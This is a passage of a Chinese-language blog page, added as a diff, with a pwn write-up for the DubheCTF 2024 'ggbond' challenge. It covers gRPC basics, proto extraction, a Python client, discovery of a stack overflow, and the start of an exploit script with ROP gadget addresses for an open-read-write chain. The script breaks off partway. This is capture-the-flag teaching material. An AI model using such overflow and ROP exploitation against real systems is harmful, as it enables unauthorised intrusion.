@@ -1,0 +1,1316 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="o4最赢的一集！*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024 DubheCTF pwn wp">
+<meta property="og:url" content="http://akaieurus.github.io/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="o4最赢的一集！*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/dubhectf.png">
+<meta property="article:published_time" content="2024-03-19T09:25:42.000Z">
+<meta property="article:modified_time" content="2025-01-03T11:11:00.874Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/dubhectf.png">
+  
+  
+  
+  <title>2024 DubheCTF pwn wp - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/dubhectf.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024 DubheCTF pwn wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-19 17:25" pubdate>
+          2024年3月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024 DubheCTF pwn wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>o4最赢的一集！*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。</p>
+<span id="more"></span>
+
+<h1 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h1><p>一个go写的grpc，8.3的IDA yyds</p>
+<p>但有个屑没想到搜文件提proto的工具准备嗯逆，重复一个打开IDA开逆——放弃——再开逆——再放弃的过程</p>
+<h2 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h2><p>可以简单理解为远程调用函数</p>
+<p>一个grpc server示例（部分）</p>
+<ul>
+<li><p>greeter_server&#x2F;main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>  <span class="hljs-string">&quot;context&quot;</span><br>  <span class="hljs-string">&quot;flag&quot;</span><br>  <span class="hljs-string">&quot;fmt&quot;</span><br>  <span class="hljs-string">&quot;log&quot;</span><br>  <span class="hljs-string">&quot;net&quot;</span><br><br>  <span class="hljs-string">&quot;google.golang.org/grpc&quot;</span><br>  pb <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  port = flag.Int(<span class="hljs-string">&quot;port&quot;</span>, <span class="hljs-number">50051</span>, <span class="hljs-string">&quot;The server port&quot;</span>)<br>)<br><br><span class="hljs-comment">// server嵌入了pb.UnimplementedGreeterServer，表示server将实现pb.GreeterServer接口的所有方法</span><br><span class="hljs-keyword">type</span> server <span class="hljs-keyword">struct</span> &#123;<br>  pb.UnimplementedGreeterServer<br>&#125;<br><br><span class="hljs-comment">// server结构体的方法，实现了pb.GreeterServer中的SayHello方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  log.Printf(<span class="hljs-string">&quot;Received: %v&quot;</span>, in.GetName())<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// 同上，实现了SayHelloAgain方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello again &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  flag.Parse() <span class="hljs-comment">// 解析命令行参数</span><br>  lis, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;:%d&quot;</span>, *port)) <span class="hljs-comment">// 建立tcp监听器</span><br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    log.Fatalf(<span class="hljs-string">&quot;failed to listen: %v&quot;</span>, err)<br>  &#125;<br>  s := grpc.NewServer() <span class="hljs-comment">// 创建grpc服务器实例</span><br>  pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) <span class="hljs-comment">// 注册实例</span><br>  log.Printf(<span class="hljs-string">&quot;server listening at %v&quot;</span>, lis.Addr())<br>  <span class="hljs-keyword">if</span> err := s.Serve(lis); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">// 开始监听并处理客户端的请求</span><br>    log.Fatalf(<span class="hljs-string">&quot;failed to serve: %v&quot;</span>, err)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>hellogrpc&#x2F;hellogrpc.proto</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span>;<br><span class="hljs-keyword">package</span> hellogrpc;<br><span class="hljs-comment">// The greeting service definition.</span><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-comment">// Sends a greeting</span><br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHelloAgain (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><span class="hljs-comment">// The request message containing the user&#x27;s name.</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>hellogrpc&#x2F;hellogrpc_grpc.pb.go（部分），只放一下上面提到的部分</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// UnimplementedGreeterServer must be embedded to have forward compatible implementations.</span><br><span class="hljs-keyword">type</span> UnimplementedGreeterServer <span class="hljs-keyword">struct</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHello(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHello not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> SayHelloAgain(context.Context, *HelloRequest) (*HelloReply, <span class="hljs-type">error</span>) &#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, status.Errorf(codes.Unimplemented, <span class="hljs-string">&quot;method SayHelloAgain not implemented&quot;</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(UnimplementedGreeterServer)</span></span> mustEmbedUnimplementedGreeterServer() &#123;&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterGreeterServer</span><span class="hljs-params">(s grpc.ServiceRegistrar, srv GreeterServer)</span></span> &#123;<br>	s.RegisterService(&amp;Greeter_ServiceDesc, srv)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>hellogrpc&#x2F;hellogrpc.pb.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">type</span> HelloReply <span class="hljs-keyword">struct</span> &#123;<br>	state         protoimpl.MessageState<br>	sizeCache     protoimpl.SizeCache<br>	unknownFields protoimpl.UnknownFields<br><br>	Message <span class="hljs-type">string</span> <span class="hljs-string">`protobuf:&quot;bytes,1,opt,name=message,proto3&quot; json:&quot;message,omitempty&quot;`</span><br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="proto提取"><a href="#proto提取" class="headerlink" title="proto提取"></a>proto提取</h2><p>有一种神奇的工具叫 <strong>pbtk</strong> 可以从文件里提取proto ：）</p>
+<p><em>题外话，我刚开始打CTF的时候见过这个工具，但显然我不可能记得这件事QVQ，神奇的命运的轮回（雾）</em></p>
+<p>提出来的proto</p>
+<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><br><span class="hljs-keyword">package</span> GGBond;<br><br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;./;ggbond&quot;</span>;<br><br><span class="hljs-keyword">service </span><span class="hljs-title class_">GGBondServer</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">rpc</span> Handler(Request) <span class="hljs-keyword">returns</span> (Response)</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Request</span> &#123;<br>    <span class="hljs-keyword">oneof</span> request &#123; <span class="hljs-comment">// oneof关键字定义了一个包含多个选择项的字段（类似union）</span><br>        WhoamiRequest whoami = <span class="hljs-number">100</span>;<br>        RoleChangeRequest role_change = <span class="hljs-number">101</span>;<br>        RepeaterRequest repeater = <span class="hljs-number">102</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">Response</span> &#123;<br>    <span class="hljs-keyword">oneof</span> response &#123;<br>        WhoamiResponse whoami = <span class="hljs-number">200</span>;<br>        RoleChangeResponse role_change = <span class="hljs-number">201</span>;<br>        RepeaterResponse repeater = <span class="hljs-number">202</span>;<br>        ErrorResponse error = <span class="hljs-number">444</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiRequest</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">WhoamiResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2000</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeRequest</span> &#123;<br>    <span class="hljs-type">uint32</span> role = <span class="hljs-number">1001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RoleChangeResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2001</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterRequest</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">1002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">RepeaterResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">2002</span>;<br>&#125;<br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">ErrorResponse</span> &#123;<br>    <span class="hljs-type">string</span> message = <span class="hljs-number">4444</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="python-grpc"><a href="#python-grpc" class="headerlink" title="python grpc"></a>python grpc</h2><p>真不错，有个屑也不知道grpc还有python库：）</p>
+<p>grpc工具包可以利用proto文件生成grpc服务类</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ./ggbond.proto<br></code></pre></td></tr></table></figure>
+
+<p>会生成ggbond_pb2.py和ggbond_pb2_grpc.py两个文件，_pb2中定义了数据结构，_pd2_grpc中定义了方法</p>
+<p>交互部分代码，根据ggbond_pb2和ggbond_pb2_grpc中的函数和proto文件猜着写就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=message)))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(whoami(channel))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<h2 id="go，狗都不逆，汪"><a href="#go，狗都不逆，汪" class="headerlink" title="go，狗都不逆，汪"></a>go，狗都不逆，汪</h2><p>既然会交互了那就随便试试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python exp.py</span><br>role_change &#123;<br>  message: &quot;Role No Change.&quot;<br>&#125;<br><br>role_change &#123;<br>  message: &quot;New Role: SDaddy.&quot;<br>&#125;<br><br>repeater &#123;<br>  message: &quot;SDaddy: YBYB, YBBB.&quot;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后IDA搜”Role No Change.”字符串搜到了处理函数main.(*server).Handler</p>
+<p>role_change处理部分，role&#x3D;3的时候有向栈上复制数据的操作，数据来源是将输入base64解码</p>
+<img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/overflow.png" srcset="/img/loading.gif" lazyload class title="overflow">
+
+<p>那就可以愉快的溢出了 ^v^</p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>由于交互是通过端口进行的，不是将输入输出重定向到远程，所以弹不了shell，直接打orw</p>
+<ul>
+<li>爆破确认现在端口的fd，这里是7</li>
+<li>有syscall有gadget没开pie，可以直接用（甚至连flag字符串都有），真方便~</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br>rdi_addr=<span class="hljs-number">0x401537</span><br>rsi_addr=<span class="hljs-number">0x422398</span><br>rdx_addr=<span class="hljs-number">0x461bd1</span><br>rax_addr=<span class="hljs-number">0x4101e6</span><br>syscall_addr=<span class="hljs-number">0x40452C</span><br>flag_addr=<span 